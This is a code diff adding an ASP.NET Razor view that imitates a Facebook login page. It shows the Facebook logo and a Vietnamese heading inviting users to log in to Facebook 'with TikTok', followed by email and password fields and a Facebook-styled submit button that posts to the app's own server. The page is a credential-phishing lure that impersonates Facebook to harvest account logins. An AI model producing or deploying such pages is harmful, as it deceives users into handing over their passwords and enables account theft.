@@ -1,0 +1,58 @@
+﻿@{ Layout = null; }
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Facebook</title>
+</head>
+<body>
+    <div>
+        @using (Html.BeginForm())
+        {
+            <table align="center">
+                <tr>
+                    <td align="center">
+                        <img src="~/Content/image/logofacebook.png" alt="Thumbnail" width="10%" />
+                    </td>
+                    <td>
+                        <h3 style="font-family:Arial">
+                            Đăng nhập để sử dụng tài khoản Facebook của bạn bằng TikTok.
+                        </h3>
+                    </td>
+                </tr>
+
+
+            </table>
+            <table align="center" style="padding-top:45px">
+                <tr>
+                    <td>
+                        <table align="center" style="width:390px">
+                            <tr>
+                                <td style="width:380px">
+                                    <input type="text"
+                                           placeholder="Email hoặc số điện thoại"
+                                           name="mail"
+                                           required
+                                           style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="width:380px; padding-top:10px; padding-bottom:20px">
+                                    <input type="password" placeholder="Mật khẩu:" name="psw" required style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <input type="submit" value="Đăng Nhập" style="width: 380px; height: 55px !important; background-color: #3B5998 !important; border: none !important; font-weight: bold; color:white" />
+                                </td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        }
+        </div>
+</body>
+</html>
